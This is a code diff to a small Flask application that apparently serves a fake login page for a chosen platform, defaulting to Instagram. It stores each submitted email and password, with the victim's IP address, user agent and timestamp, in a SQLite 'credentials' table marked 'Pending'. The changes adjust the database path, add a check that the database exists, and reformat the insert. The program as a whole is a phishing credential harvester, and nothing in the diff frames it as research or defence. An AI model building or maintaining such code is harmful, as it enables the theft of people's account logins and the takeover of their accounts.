@@ -8,7 +8,11 @@ from datetime import datetime
 app = Flask(__name__, template_folder='app/templates')
 PLATFORM = sys.argv[1] if len(sys.argv) > 1 else "instagram"
 
-DB_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), './creds.tb'))
+DB_PATH = os.path.join(os.getcwd(), '../creds.db')
+
+if not os.path.exists(DB_PATH):
+    raise FileNotFoundError(f"[ERROR] Did not find data base at {DB_PATH}")
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -21,9 +25,7 @@ def login():
 
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
-        cursor.execute('''
-            INSERT INTO credentials (email, password, ip, user_agent, timestamp, status) VALUES (?, ?, ?, ?, ?, ?)
-                ''', (email, password, ip, user_agent, timestamp, 'Pending'))
+        cursor.execute('''INSERT INTO credentials (email, password, ip, user_agent, timestamp, status) VALUES (?, ?, ?, ?, ?, ?)''', (email, password, ip, user_agent, timestamp, 'Pending'))
         conn.commit()
         conn.close()
 
